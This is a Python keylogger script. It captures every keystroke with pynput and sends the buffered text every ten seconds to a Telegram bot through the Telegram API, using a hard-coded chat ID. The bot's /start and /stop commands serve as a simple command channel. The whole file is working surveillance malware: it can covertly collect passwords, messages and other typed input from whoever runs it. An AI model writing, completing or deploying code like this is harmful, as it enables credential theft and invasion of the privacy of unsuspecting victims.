import os
import sys
import threading
import time
import telegram.ext
import requests
from pynput import keyboard

data = ""

# Telegram API Key
TOKEN = "" # Your API Key


# Command Control Code
def start(update, context):
    update.message.reply_text("Keylogger Started !!")
    pass


def stop(update, context):
    update.message.reply_text("Keylogger Stopped !!")
    sys.exit()
    pass


# Converting and Refining Key Strokes
def log(key):
    global data
    data += str(key) \
        .replace("Key.shift", "") \
        .replace("Key.space", " ") \
        .replace("Key.enter", "\n") \
        .replace("Key.tab", "    ") \
        .replace("Key.caps_lock", "") \
        .replace("Key.alt_l", "") \
        .replace("Key.alt_gr", "") \
        .replace("Key.ctrl_l", "") \
        .replace("Key.ctrl_r", "") \
        .replace("Key.f1", "") \
        .replace("Key.f2", "") \
        .replace("Key.f3", "") \
        .replace("Key.f4", "") \
        .replace("Key.f5", "") \
        .replace("Key.f6", "") \
        .replace("Key.f7", "") \
        .replace("Key.f8", "") \
        .replace("Key.f9", "") \
        .replace("Key.f10", "") \
        .replace("Key.f11", "") \
        .replace("Key.f12", "") \
        .replace("Key.delete", "{D}") \
        .replace("Key.backspace", "\b") \
        .replace("Key.up", "{UP_KEY}") \
        .replace("Key.down", "{DOWN_KEY}") \
        .replace("Key.right", "{LEFT_KEY}") \
        .replace("Key.left", "{RIGHT_KEY}") \
        .strip("'")


# Sending Key Strokes to Telegram Bot
def send():
    while True:
        global data
        time.sleep(10)
        if data != "":
            requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage"
                         "?chat_id=935945074&text=" + data)
        data = ""


# Multi-Threading Code
t = threading.Thread(target=send)
t.start()

# Commands Handling From Telegram Bot
updater = telegram.ext.Updater(TOKEN, use_context=True)
disp = updater.dispatcher
disp.add_handler(telegram.ext.CommandHandler("start", start))
disp.add_handler(telegram.ext.CommandHandler("stop", stop))
updater.start_polling()

# Listening & Sending Key Strokes to Log Function
listener = keyboard.Listener(on_press=log)
with listener:
    listener.join()
